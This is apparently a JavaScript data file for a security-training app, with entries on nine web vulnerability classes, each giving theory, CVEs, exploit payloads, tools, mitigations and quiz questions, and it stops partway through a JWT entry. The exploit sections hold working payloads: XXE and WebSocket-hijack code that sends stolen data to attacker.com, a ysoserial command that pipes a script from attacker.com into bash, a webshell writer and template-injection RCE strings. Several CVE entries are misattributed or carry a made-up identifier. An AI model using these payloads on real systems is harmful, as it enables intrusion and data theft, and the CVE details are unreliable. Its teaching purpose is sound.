const VULN_DATA = [
  {
    day: 1,
    date: "2026-06-24",
    title: "Server-Side Request Forgery (SSRF)",
    severity: "CRITICAL",
    category: "Server-Side Attacks",
    icon: "🌐",
    definition: "SSRF is a vulnerability that allows attackers to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. The server acts as a proxy, fetching resources on behalf of the attacker — often reaching internal services that are not publicly accessible.",
    theory: `SSRF occurs when an application fetches a remote resource based on user-supplied input without proper validation. The attack abuses trust relationships: the target server trusts requests from its own infrastructure, so an attacker can pivot through the vulnerable server into the internal network.

**Why it's dangerous:**
- Access internal AWS metadata (http://169.254.169.254)
- Port scan internal networks via the server
- Read local files via file:// protocol
- Bypass WAF/IP allowlists
- Interact with internal APIs and services (Redis, Elasticsearch, etc.)

**Common SSRF Sinks:**
- URL parameters passed to fetch/curl/urllib
- PDF generators that load external stylesheets
- Image upload functions that accept URLs
- Webhook URL configurations
- Import/export features with URL inputs`,
    cve: [
      { id: "CVE-2021-26855", name: "Exchange ProxyLogon", desc: "SSRF in Microsoft Exchange Server allowed pre-auth RCE by making the server authenticate to attacker-controlled endpoints." },
      { id: "CVE-2019-6340", name: "Drupal SSRF", desc: "REST module SSRF leading to RCE via crafted JSON requests." },
      { id: "CVE-2022-22947", name: "Spring Cloud Gateway SSRF", desc: "Actuator API allowed SSRF via route configuration leading to code injection." }
    ],
    exploit: `**Step 1: Identify SSRF entry points**
Look for parameters like:
\`url=\`, \`path=\`, \`dest=\`, \`redirect=\`, \`uri=\`, \`window=\`, \`next=\`, \`data=\`, \`host=\`

**Step 2: Basic SSRF test**
\`\`\`
GET /fetch?url=http://internal-service:8080/admin HTTP/1.1
Host: victim.com
\`\`\`

**Step 3: AWS Metadata leak (Cloud)**
\`\`\`
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
\`\`\`

**Step 4: SSRF via DNS rebinding bypass**
\`\`\`
# Use a domain that resolves to 127.0.0.1
GET /fetch?url=http://ssrf.attacker.com/
\`\`\`

**Step 5: Bypass filters**
\`\`\`
http://127.0.0.1          # classic
http://0.0.0.0            # alternative
http://[::1]              # IPv6
http://0x7f000001         # hex
http://2130706433         # decimal
http://localhost.attacker.com  # DNS bypass
\`\`\`

**Burp Collaborator method:**
Set url= to your Burp Collaborator URL and observe the outbound DNS/HTTP request to confirm blind SSRF.`,
    tools: ["Burp Suite", "SSRFmap", "Gopherus", "curl"],
    mitigation: "Allowlist valid URLs/domains, block private IP ranges, use a network-level firewall to prevent outbound requests from app servers, disable unnecessary URL-fetching features.",
    quiz: [
      { q: "Which IP range is used to access cloud instance metadata and is a common SSRF target?", options: ["10.0.0.1", "192.168.1.1", "169.254.169.254", "172.16.0.1"], answer: 2 },
      { q: "Which protocol can SSRF abuse to read local files on the server?", options: ["ftp://", "file://", "sftp://", "ldap://"], answer: 1 },
      { q: "What technique is used to bypass IP-based SSRF filters?", options: ["SQL comments", "DNS rebinding", "HTTP pipelining", "Cookie injection"], answer: 1 },
      { q: "CVE-2021-26855 affected which Microsoft product?", options: ["SharePoint", "Exchange Server", "Azure AD", "IIS"], answer: 1 },
      { q: "Which decimal value is equivalent to 127.0.0.1 and can be used to bypass SSRF filters?", options: ["16777343", "2130706433", "3232235777", "167772161"], answer: 1 }
    ]
  },
  {
    day: 2,
    date: "2026-06-25",
    title: "XML External Entity (XXE) Injection",
    severity: "HIGH",
    category: "Injection",
    icon: "📄",
    definition: "XXE injection is an attack against applications that parse XML input. It exploits a feature of XML parsers called 'external entities' — references to external resources defined in the Document Type Definition (DTD). When enabled, an attacker can use this to read local files, perform SSRF, or cause denial of service.",
    theory: `XML supports a feature called External Entities defined in the DTD. When an XML parser processes a DOCTYPE declaration with an external entity, it fetches the referenced resource — which could be a local file or a remote URL.

**XXE Entity Types:**
- **Classic XXE**: Reads file contents in response
- **Blind XXE**: No response, exfil via out-of-band (DNS/HTTP)
- **XXE via file upload**: Upload a .docx, .svg, .xlsx (XML-based formats)
- **XXE to SSRF**: Make the XML parser fetch internal URLs
- **Billion Laughs (DoS)**: Recursive entity expansion crashes parser

**Vulnerable XML features:**
- SOAP endpoints
- File upload (SVG, DOCX, XLSX, ODF)
- RSS/Atom feeds
- XML-based APIs`,
    cve: [
      { id: "CVE-2018-1000632", name: "dom4j XXE", desc: "Java's dom4j library allowed XXE injection in applications using XML parsing." },
      { id: "CVE-2021-44228-related", name: "XXE in Apache OFBiz", desc: "XML parser in OFBiz allowed reading server files via XXE before authentication." },
      { id: "CVE-2019-11932", name: "WhatsApp XXE via GIF", desc: "Double-free bug triggered via crafted GIF containing XML payloads." }
    ],
    exploit: `**Basic XXE - Read /etc/passwd:**
\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
\`\`\`

**XXE to SSRF:**
\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>
\`\`\`

**Blind XXE - Out of Band Exfil:**
\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>
\`\`\`

**evil.dtd on attacker.com:**
\`\`\`xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
\`\`\`

**XXE via SVG upload:**
\`\`\`xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="12">&xxe;</text>
</svg>
\`\`\``,
    tools: ["Burp Suite", "XXEinjector", "oxml_xxe"],
    mitigation: "Disable external entity processing in XML parsers. Use SAML libraries that disable XXE by default. Use JSON instead of XML where possible. Apply least privilege to file system access.",
    quiz: [
      { q: "What XML feature enables XXE attacks?", options: ["XML Schema", "External Entity in DTD", "XPath expressions", "XSLT transforms"], answer: 1 },
      { q: "What type of XXE uses DNS or HTTP requests to exfiltrate data when no direct output is returned?", options: ["Reflected XXE", "Classic XXE", "Blind Out-of-Band XXE", "Error-based XXE"], answer: 2 },
      { q: "Which file format upload can trigger XXE due to its XML-based structure?", options: ["PNG", "MP4", "SVG", "GIF"], answer: 2 },
      { q: "The 'Billion Laughs' attack via XXE causes which type of impact?", options: ["Data exfiltration", "Remote code execution", "Denial of Service", "Privilege escalation"], answer: 2 },
      { q: "Which best practice prevents XXE by default?", options: ["Encode XML output", "Disable external entity processing in the parser", "Use HTTPS", "Add CSRF token"], answer: 1 }
    ]
  },
  {
    day: 3,
    date: "2026-06-26",
    title: "Insecure Deserialization",
    severity: "CRITICAL",
    category: "Injection",
    icon: "🔄",
    definition: "Insecure deserialization occurs when an application deserializes data from untrusted sources without validation. Attackers craft malicious serialized objects that, when deserialized, execute arbitrary code, manipulate application logic, or escalate privileges.",
    theory: `Serialization converts objects into a format (bytes, JSON, XML) for storage/transmission. Deserialization reconstructs them. If an attacker can control the serialized data, they can create 'gadget chains' — sequences of classes that execute code during deserialization.

**Language-specific risks:**
- **Java**: ObjectInputStream, Apache Commons Collections gadgets, ysoserial
- **PHP**: unserialize(), magic methods __wakeup(), __destruct()
- **Python**: pickle.loads(), yaml.load() 
- **Ruby**: Marshal.load()
- **.NET**: BinaryFormatter, DataContractSerializer

**Attack types:**
- **RCE via gadget chains**: Chained method calls triggered on deserialization
- **Object injection**: Modify serialized data to change app logic
- **DoS**: Nested objects consuming memory
- **Authentication bypass**: Tamper with session tokens`,
    cve: [
      { id: "CVE-2015-4852", name: "Apache Commons Collections RCE", desc: "Java deserialization gadget chain in Apache Commons Collections allowed RCE in WebLogic, JBoss, Jenkins." },
      { id: "CVE-2021-44228", name: "Log4Shell (deserialization component)", desc: "JNDI lookup in Log4j2 triggered deserialization of remote objects." },
      { id: "CVE-2019-0232", name: "Apache Tomcat CGI RCE", desc: "Insecure deserialization in Windows Tomcat CGI allowing command injection." }
    ],
    exploit: `**PHP Object Injection Example:**
\`\`\`php
// Vulnerable code
$data = unserialize($_COOKIE['user_data']);

// Craft malicious object - class with __destruct:
class Logger {
  public $logFile = '/var/www/html/shell.php';
  public $logData = '<?php system($_GET["cmd"]); ?>';
  function __destruct() {
    file_put_contents($this->logFile, $this->logData);
  }
}
$payload = serialize(new Logger());
// Set as cookie → deserialization writes a webshell
\`\`\`

**Java - ysoserial tool:**
\`\`\`bash
# Generate payload for Commons Collections 3.1
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/shell.sh|bash' | base64

# Send via Burp in serialized data field (look for rO0AB header in base64)
\`\`\`

**Detecting Java serialization:**
\`\`\`
Base64: rO0AB...
Hex: AC ED 00 05
\`\`\`

**Python Pickle RCE:**
\`\`\`python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

payload = base64.b64encode(pickle.dumps(Exploit()))
# Submit as serialized session data
\`\`\``,
    tools: ["ysoserial", "PHPGGC", "Burp Suite Deserialization Scanner", "Gadget Inspector"],
    mitigation: "Never deserialize untrusted data. Use signed/encrypted tokens (JWT, HMAC). Prefer data formats like JSON. Implement deserialization allowlists. Use Java agent-based protection (SerialKiller).",
    quiz: [
      { q: "What is a 'gadget chain' in the context of insecure deserialization?", options: ["A hardware debugging tool", "A sequence of existing code reused to execute malicious actions during deserialization", "A type of SQL injection", "A network packet chain"], answer: 1 },
      { q: "What magic bytes in hex indicate a Java serialized object?", options: ["FF D8 FF E0", "AC ED 00 05", "25 50 44 46", "89 50 4E 47"], answer: 1 },
      { q: "Which Python function is dangerous when used with untrusted data?", options: ["json.loads()", "pickle.loads()", "base64.decode()", "hashlib.md5()"], answer: 1 },
      { q: "Which tool is used to generate Java deserialization payloads?", options: ["sqlmap", "ysoserial", "gobuster", "nikto"], answer: 1 },
      { q: "Which PHP magic method is commonly abused in deserialization attacks?", options: ["__toString()", "__construct()", "__destruct()", "__clone()"], answer: 2 }
    ]
  },
  {
    day: 4,
    date: "2026-06-27",
    title: "HTTP Request Smuggling",
    severity: "HIGH",
    category: "Protocol Attacks",
    icon: "📡",
    definition: "HTTP Request Smuggling exploits discrepancies between how front-end (load balancer/CDN) and back-end servers parse HTTP/1.1 request boundaries, specifically the Content-Length and Transfer-Encoding headers. An attacker can 'smuggle' a hidden request that poisons the back-end server's request queue.",
    theory: `HTTP/1.1 has two methods to specify body length: Content-Length (CL) and Transfer-Encoding: chunked (TE). When front-end and back-end disagree on which to prioritize, an attacker can craft a request where the front-end sees one request but the back-end sees two.

**Attack variants:**
- **CL.TE**: Front-end uses Content-Length, back-end uses Transfer-Encoding
- **TE.CL**: Front-end uses Transfer-Encoding, back-end uses Content-Length
- **TE.TE**: Both support TE but one can be confused with obfuscation

**Impact:**
- Bypass security controls (WAF, authentication)
- Capture other users' requests/credentials
- Cache poisoning
- XSS via reflected smuggled content
- Internal service access`,
    cve: [
      { id: "CVE-2020-13482", name: "HAProxy Request Smuggling", desc: "HAProxy allowed CL.TE smuggling bypassing security policies." },
      { id: "CVE-2019-18277", name: "HAProxy TE.CL", desc: "Another variant exploiting chunked encoding parsing differences." },
      { id: "CVE-2022-26377", name: "Apache mod_proxy Smuggling", desc: "Apache HTTP server mod_proxy HTTP request smuggling vulnerability." }
    ],
    exploit: `**CL.TE Smuggling:**
\`\`\`http
POST / HTTP/1.1
Host: victim.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
\`\`\`

**TE.CL Smuggling:**
\`\`\`http
POST / HTTP/1.1
Host: victim.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


\`\`\`

**Capturing victim requests (cookie theft):**
\`\`\`http
POST /search HTTP/1.1
Host: victim.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: victim.com
Content-Length: 900
Cookie: session=attacker_session

search=
\`\`\`
The next victim's request gets appended to yours, revealing their headers/cookies.

**Detecting with Burp Suite:**
Use Burp's HTTP Request Smuggler extension → "Triage" mode scans for CL.TE and TE.CL.`,
    tools: ["Burp Suite + HTTP Request Smuggler extension", "smuggler.py", "h2csmuggler"],
    mitigation: "Normalize requests at reverse proxies. Reject ambiguous requests with both CL and TE headers. Use HTTP/2 end-to-end. Keep servers up to date.",
    quiz: [
      { q: "HTTP Request Smuggling exploits ambiguity between which two headers?", options: ["Host and Origin", "Content-Length and Transfer-Encoding", "Authorization and Cookie", "Accept and Content-Type"], answer: 1 },
      { q: "In CL.TE smuggling, which server prioritizes Content-Length?", options: ["Back-end only", "Front-end only", "Both servers", "Neither server"], answer: 1 },
      { q: "What is a common impact of request smuggling attacks?", options: ["Brute forcing passwords", "Capturing other users' cookies/session tokens", "Encrypting files", "Crashing the database"], answer: 1 },
      { q: "Which Burp Suite extension is specifically designed to detect request smuggling?", options: ["ActiveScan++", "Logger++", "HTTP Request Smuggler", "Param Miner"], answer: 2 },
      { q: "Using HTTP/2 end-to-end helps mitigate smuggling because:", options: ["HTTP/2 has no headers", "HTTP/2 uses binary framing with explicit length fields, eliminating CL/TE ambiguity", "HTTP/2 requires authentication", "HTTP/2 compresses all requests"], answer: 1 }
    ]
  },
  {
    day: 5,
    date: "2026-06-28",
    title: "Server-Side Template Injection (SSTI)",
    severity: "CRITICAL",
    category: "Injection",
    icon: "🧩",
    definition: "SSTI occurs when user input is embedded directly into a server-side template engine and executed as template code. Unlike XSS (client-side), SSTI runs on the server and can lead to full remote code execution.",
    theory: `Template engines like Jinja2, Twig, Freemarker, Smarty, and Pebble allow dynamic HTML generation. If user input is rendered as a template expression rather than as literal text, the engine evaluates it — running attacker-controlled code on the server.

**Common template engines:**
- **Python**: Jinja2, Mako, Tornado
- **PHP**: Twig, Smarty, Blade
- **Java**: Freemarker, Velocity, Pebble, Thymeleaf
- **Ruby**: ERB, Slim
- **JavaScript**: Handlebars, Pug, EJS

**Detection methodology:**
Inject mathematical expressions like \`{{7*7}}\`, \`${7*7}\`, \`<%= 7*7 %>\`, \`#{7*7}\`
If the response shows 49, SSTI is confirmed.`,
    cve: [
      { id: "CVE-2019-8341", name: "Flask Jinja2 SSTI", desc: "Flask debug mode SSTI allowing RCE via crafted template expressions." },
      { id: "CVE-2020-12480", name: "Pebble SSTI RCE", desc: "Pebble Java template engine SSTI leading to remote code execution." },
      { id: "CVE-2022-21724", name: "Freemarker Template Injection", desc: "Apache Freemarker template injection in multiple enterprise applications." }
    ],
    exploit: `**Detection probes:**
\`\`\`
{{7*7}}         → Jinja2/Twig (returns 49)
${7*7}          → Freemarker/Thymeleaf
<%= 7*7 %>      → ERB (Ruby)
#{7*7}          → Ruby EL
*{7*7}          → Spring SpEL
\`\`\`

**Jinja2 RCE (Python):**
\`\`\`python
# Read file
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Full RCE
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}

# Simpler with config
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
\`\`\`

**Twig RCE (PHP):**
\`\`\`php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
\`\`\`

**Freemarker RCE (Java):**
\`\`\`
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
\`\`\`

**Finding via Burp Intruder:**
Test all input fields with probe payloads, look for "49" or error messages revealing template engine names.`,
    tools: ["tplmap", "Burp Suite", "SSTImap"],
    mitigation: "Never concatenate user input into templates. Use sandboxed template engines. Pass user data as template variables, not as the template itself. Implement strict input validation.",
    quiz: [
      { q: "What probe confirms Jinja2 SSTI when the response contains '49'?", options: ["${7*7}", "{{7*7}}", "#{7*7}", "<%= 7*7 %>"], answer: 1 },
      { q: "How does SSTI differ from XSS?", options: ["SSTI is client-side, XSS is server-side", "SSTI executes on the server, XSS executes in the browser", "They are the same vulnerability", "SSTI only affects databases"], answer: 1 },
      { q: "Which template engine is commonly used with Python/Flask?", options: ["Twig", "Freemarker", "Jinja2", "Handlebars"], answer: 2 },
      { q: "Which tool automates SSTI detection and exploitation across multiple template engines?", options: ["sqlmap", "tplmap", "nikto", "dirbuster"], answer: 1 },
      { q: "What is the primary risk of SSTI compared to XSS?", options: ["It affects more browsers", "It leads to server-side RCE instead of client-side script execution", "It only works on POST requests", "It requires admin credentials"], answer: 1 }
    ]
  },
  {
    day: 6,
    date: "2026-06-29",
    title: "Race Conditions",
    severity: "HIGH",
    category: "Logic Flaws",
    icon: "⚡",
    definition: "Race conditions occur when an application's behavior depends on the timing of events, and concurrent requests interfere with each other. Attackers exploit TOCTOU (Time-Of-Check to Time-Of-Use) windows to perform actions multiple times, bypass limits, or corrupt state.",
    theory: `Modern web applications handle concurrent requests. If a check and the action it guards are not atomic, an attacker can squeeze between them.

**Classic scenarios:**
- **Limit bypass**: Apply a coupon 10x by sending 10 parallel requests before any single one is marked 'used'
- **Race to win**: Purchase an item at the old price after price changes
- **Double-spend**: Withdraw funds multiple times before balance updates
- **Account takeover**: Race condition in password reset token validation
- **File upload races**: Overwrite files between upload and processing steps

**Web-specific race conditions:**
HTTP/2 allows multiple requests in a single packet (single-packet attack), making races more reliable. Burp Suite's 'single-packet attack' mode exploits this.`,
    cve: [
      { id: "CVE-2022-21703", name: "Grafana CSRF + Race", desc: "Race condition in Grafana allowing privilege escalation via concurrent API calls." },
      { id: "CVE-2021-4191", name: "GitLab Race Condition", desc: "Race in GitLab pipeline API allowed bypassing subscription limits." },
      { id: "CVE-2023-24329", name: "Python urllib Race", desc: "Race condition in URL parsing allowing filter bypass." }
    ],
    exploit: `**Testing with Burp Suite Turbo Intruder (single-packet attack):**
\`\`\`python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # Fire all at once!

def handleResponse(req, interesting):
    table.add(req)
\`\`\`

**cURL parallel race:**
\`\`\`bash
# Send 10 requests simultaneously 
for i in {1..10}; do
  curl -s -X POST https://victim.com/apply-coupon \
    -d "code=SAVE50" \
    -H "Cookie: session=abc123" &
done
wait
\`\`\`

**Limit-bypass scenario:**
1. Find a one-use action (gift card, promo code, vote)
2. Capture the request in Burp
3. Send to Repeater → right-click → "Send to Turbo Intruder"
4. Use single-packet attack mode
5. Check if action was applied multiple times`,
    tools: ["Burp Suite Turbo Intruder", "curl parallel", "Racepwn", "Repeater groups in Burp"],
    mitigation: "Use atomic database operations and transactions. Implement mutex/locking. Use database-level constraints (UNIQUE keys). Apply idempotency tokens. Rate-limit sensitive endpoints.",
    quiz: [
      { q: "What does TOCTOU stand for in race condition vulnerabilities?", options: ["Time-Of-Connection To Outside-User", "Time-Of-Check To Time-Of-Use", "Token Of Client To Token Of URL", "Type-Of-Class To Type-Of-User"], answer: 1 },
      { q: "Which Burp Suite feature is best for exploiting web race conditions?", options: ["Intruder cluster bomb", "Turbo Intruder single-packet attack", "Repeater manual send", "Scanner active scan"], answer: 1 },
      { q: "Why does HTTP/2 make race conditions more reliable to exploit?", options: ["HTTP/2 is slower", "HTTP/2 allows multiple requests in a single TCP packet, ensuring near-simultaneous arrival", "HTTP/2 disables authentication", "HTTP/2 compresses payloads"], answer: 1 },
      { q: "Which database mechanism best prevents race condition exploits?", options: ["Adding delays between requests", "Using atomic transactions and row-level locking", "Using GET instead of POST", "Validating input length"], answer: 1 },
      { q: "A gift card used multiple times via race condition is an example of which sub-type?", options: ["UAF (Use After Free)", "Limit bypass race condition", "SSRF race", "XXE race"], answer: 1 }
    ]
  },
  {
    day: 7,
    date: "2026-06-30",
    title: "OAuth 2.0 Vulnerabilities",
    severity: "HIGH",
    category: "Authentication & Authorization",
    icon: "🔑",
    definition: "OAuth 2.0 is an authorization framework widely used for 'Login with Google/Facebook/GitHub'. Misimplementations lead to account takeover, token theft, CSRF, and open redirect vulnerabilities that allow attackers to hijack OAuth flows.",
    theory: `OAuth 2.0 involves three parties: Resource Owner (user), Client (app), Authorization Server (Google, etc.). The flow issues authorization codes exchanged for access tokens.

**Common OAuth vulnerabilities:**
- **Missing state parameter (CSRF)**: No CSRF protection on the redirect allows code injection
- **Open redirect in redirect_uri**: Token sent to attacker's server via crafted redirect_uri
- **Authorization code interception**: Code stolen from referrer headers or logs
- **Scope escalation**: Requesting more permissions than declared
- **Implicit flow token leakage**: Access token in URL fragment exposed to browser history/referrers
- **JWT algorithm confusion**: Swapping RS256 to HS256 using public key as secret`,
    cve: [
      { id: "CVE-2021-27928", name: "OAuth CSRF in multiple apps", desc: "Missing state parameter in OAuth implementation allowed account hijacking." },
      { id: "CVE-2022-24785", name: "Moment.js path traversal via OAuth", desc: "OAuth-linked library had path traversal allowing token exfil." },
      { id: "CVE-2023-28116", name: "Outline OAuth bypass", desc: "Improper OAuth validation allowing account takeover without email verification." }
    ],
    exploit: `**1. CSRF via missing state parameter:**
\`\`\`
# Normal OAuth URL:
https://auth.server.com/oauth?client_id=app&redirect_uri=https://victim.com/callback&state=RANDOM

# If state is missing or predictable, craft:
<img src="https://victim.com/callback?code=ATTACKER_CODE">
# Victim's account linked to attacker's OAuth account
\`\`\`

**2. redirect_uri manipulation:**
\`\`\`
# Original:
redirect_uri=https://legit-app.com/callback

# Tamper to open redirect:
redirect_uri=https://legit-app.com/callback/../../../external-redirect?url=https://attacker.com

# Or add extra path (if not strictly validated):
redirect_uri=https://legit-app.com/callback%2F..%2Fattacker.com
\`\`\`

**3. Authorization code leakage via Referer:**
\`\`\`
# If callback page loads third-party resources, the code= in URL leaks via Referer header
https://victim.com/callback?code=SECRET_CODE
# Page loads: https://analytics.com/script.js
# Referer header: https://victim.com/callback?code=SECRET_CODE  ← LEAKED!
\`\`\`

**4. Token theft via open redirect:**
\`\`\`
https://auth.server.com/oauth?response_type=token&redirect_uri=https://victim.com/open-redirect?url=https://attacker.com
\`\`\``,
    tools: ["Burp Suite", "oauth2-security-testing", "Postman"],
    mitigation: "Always validate state parameter. Strictly enforce redirect_uri allowlisting. Use authorization code flow with PKCE. Avoid implicit flow. Validate all tokens server-side.",
    quiz: [
      { q: "What OAuth parameter prevents CSRF attacks during the authorization flow?", options: ["scope", "client_id", "state", "nonce"], answer: 2 },
      { q: "What vulnerability allows an attacker to receive authorization codes meant for a legitimate app?", options: ["SQL injection", "redirect_uri manipulation", "XSS", "Buffer overflow"], answer: 1 },
      { q: "The implicit OAuth flow is considered less secure because:", options: ["It's too slow", "The access token is returned in the URL fragment, exposing it to browser history and referrers", "It requires client secrets", "It uses HTTP instead of HTTPS"], answer: 1 },
      { q: "PKCE (Proof Key for Code Exchange) was introduced to protect against:", options: ["XSS stealing tokens", "Authorization code interception in mobile/public clients", "SQL injection in auth servers", "Brute force on passwords"], answer: 1 },
      { q: "Which information leaks an authorization code to third-party trackers on the callback page?", options: ["Cookie header", "Authorization header", "Referer header", "Content-Type header"], answer: 2 }
    ]
  },
  {
    day: 8,
    date: "2026-07-01",
    title: "WebSockets Security",
    severity: "MEDIUM",
    category: "Protocol Attacks",
    icon: "🔌",
    definition: "WebSocket vulnerabilities arise from improper implementation of the WebSocket protocol, which provides full-duplex communication channels. Attackers exploit lack of origin validation, weak authentication, and message injection to hijack connections or extract data.",
    theory: `WebSockets upgrade from HTTP and maintain persistent connections. Security issues unique to WebSockets:

**Cross-Site WebSocket Hijacking (CSWSH):**
If the server only uses cookies for authentication and doesn't validate the Origin header, a malicious site can open a WebSocket to the victim server using the victim's cookies.

**WebSocket message injection:**
Sending crafted messages through the WebSocket connection can trigger SSTI, SQL injection, or command injection server-side.

**Lack of CSRF protection:**
WebSocket handshake doesn't support standard CSRF tokens.

**Unencrypted ws:// connections:**
Using ws:// instead of wss:// exposes data to MITM attacks.`,
    cve: [
      { id: "CVE-2020-7656", name: "jQuery WebSocket XSS", desc: "Improper message sanitization in WebSocket handlers led to persistent XSS." },
      { id: "CVE-2021-38296", name: "Apache Spark WebSocket", desc: "Unauthenticated WebSocket endpoints exposed internal cluster data." }
    ],
    exploit: `**Cross-Site WebSocket Hijacking:**
\`\`\`javascript
// Attacker's page (victim visits this)
var ws = new WebSocket('wss://victim.com/chat');

ws.onopen = function() {
  // Connection uses victim's cookies!
  ws.send('{"type":"get_messages","room":"private"}');
};

ws.onmessage = function(event) {
  // Send stolen data to attacker
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(event.data));
};
\`\`\`

**Testing with Burp Suite:**
1. Intercept WebSocket upgrade request
2. Check if Origin header is validated
3. Use Burp's WebSocket History tab
4. Replay messages with modified payloads

**WebSocket injection test:**
\`\`\`json
{"message": "{{7*7}}", "room": "test"}
{"message": "'; DROP TABLE users; --", "room": "test"}
{"message": "<img src=x onerror=alert(1)>", "room": "test"}
\`\`\`

**Detecting CSWSH:**
Change Origin header to https://attacker.com in the upgrade request. If server accepts, it's vulnerable.`,
    tools: ["Burp Suite WebSocket", "OWASP ZAP", "wscat", "Wireshark"],
    mitigation: "Validate Origin header on WebSocket handshake. Use token-based auth (not just cookies). Sanitize all messages. Use wss:// only. Implement message rate limiting.",
    quiz: [
      { q: "What does CSWSH stand for?", options: ["Cross-Site Web Shell Hijacking", "Cross-Site WebSocket Hijacking", "Client-Side WebSocket Hashing", "Cross-Service Web Scheme Hacking"], answer: 1 },
      { q: "The main difference that makes CSWSH possible over standard CSRF:", options: ["WebSockets don't support SSL", "WebSocket handshake uses cookies but doesn't support SameSite protection the same way", "WebSockets bypass firewalls", "WebSocket uses UDP"], answer: 1 },
      { q: "What should servers validate to prevent CSWSH?", options: ["User-Agent header", "Content-Length", "Origin header during the WebSocket handshake", "Accept header"], answer: 2 },
      { q: "Which protocol scheme indicates an encrypted WebSocket connection?", options: ["ws://", "http://", "wss://", "ftp://"], answer: 2 },
      { q: "If a WebSocket message field is vulnerable to injection, which tool would you use to fuzz it?", options: ["hydra", "Burp Suite Repeater with WebSocket history", "nmap", "aircrack-ng"], answer: 1 }
    ]
  },
  {
    day: 9,
    date: "2026-07-02",
    title: "GraphQL Security Vulnerabilities",
    severity: "HIGH",
    category: "API Security",
    icon: "🕸️",
    definition: "GraphQL is an API query language that replaces REST. Its flexibility introduces unique security issues: introspection leaks schema details, batching enables rate limit bypass, nested queries cause DoS, and missing authorization leads to data exposure.",
    theory: `GraphQL allows clients to request exactly the data they need using queries and mutations. Security concerns:

**Introspection abuse:** By default, GraphQL exposes its entire schema via introspection queries — revealing types, fields, and mutations an attacker can explore.

**Batching attacks:** GraphQL supports batching multiple operations in one HTTP request — bypassing per-request rate limits for brute-force.

**Deep query DoS:** Deeply nested queries consume exponential resources.

**Broken object-level authorization:** GraphQL resolvers often miss per-field authorization checks.

**Mass assignment:** Mutations accepting undocumented fields can lead to privilege escalation.`,
    cve: [
      { id: "CVE-2021-27917", name: "GraphQL Introspection Exposure", desc: "Production GraphQL APIs exposing full schema and internal field names." },
      { id: "CVE-2022-24771", name: "node-forge via GraphQL chain", desc: "GraphQL API allowing SSRF through nested resolver chains." }
    ],
    exploit: `**1. Introspection query (schema dump):**
\`\`\`graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}
\`\`\`

**2. Batching brute-force (bypass rate limiting):**
\`\`\`json
[
  {"query": "mutation { login(user:\"admin\", pass:\"pass1\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass2\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass3\") { token } }"}
  // ... 1000 more in one HTTP request
]
\`\`\`

**3. Deep nesting DoS:**
\`\`\`graphql
{
  user {
    friends {
      friends {
        friends {
          friends { name email }
        }
      }
    }
  }
}
\`\`\`

**4. Authorization bypass via field access:**
\`\`\`graphql
query {
  user(id: 2) {
    id
    email
    passwordHash    # Should not be accessible!
    adminNotes      # Internal field exposed
  }
}
\`\`\`

**Tools:**
\`\`\`bash
# Automated GraphQL recon
graphw00f -d -f -t https://victim.com/graphql
# Then use InQL or graphql-voyager to visualize schema
\`\`\``,
    tools: ["InQL (Burp extension)", "graphw00f", "GraphQL Voyager", "Altair GraphQL Client", "Clairvoyance"],
    mitigation: "Disable introspection in production. Implement query depth/complexity limits. Add per-resolver authorization. Rate-limit by query cost, not just HTTP requests. Validate and sanitize all inputs.",
    quiz: [
      { q: "Which GraphQL feature, if enabled in production, leaks the entire API schema?", options: ["Mutations", "Subscriptions", "Introspection", "Fragments"], answer: 2 },
      { q: "How does GraphQL batching enable rate limit bypass?", options: ["It uses UDP instead of TCP", "Multiple operations can be sent in one HTTP request, bypassing per-request limits", "It caches all responses", "It uses compressed payloads"], answer: 1 },
      { q: "What type of attack sends deeply nested GraphQL queries to consume server resources?", options: ["SSRF", "ReDoS", "GraphQL depth/complexity DoS", "CSRF"], answer: 2 },
      { q: "Which tool is a Burp extension specifically designed for GraphQL security testing?", options: ["SQLmap", "InQL", "tplmap", "ffuf"], answer: 1 },
      { q: "Missing authorization at the resolver level in GraphQL can lead to:", options: ["XSS attacks", "Broken Object Level Authorization — accessing other users' data", "Buffer overflow", "DNS poisoning"], answer: 1 }
    ]
  },
  {
    day: 10,
    date: "2026-07-03",
    title: "JWT Vulnerabilities",
    severity: "CRITICAL",
    category: "Authentication",
    icon: "🎫",
    definition: "JSON Web Tokens (JWT) are widely used for stateless authentication. Vulnerabilities arise from weak algorithms, algorithm confusion attacks, missing signature validation, and weak secrets — allowing attackers to forge tokens and impersonate any user.",
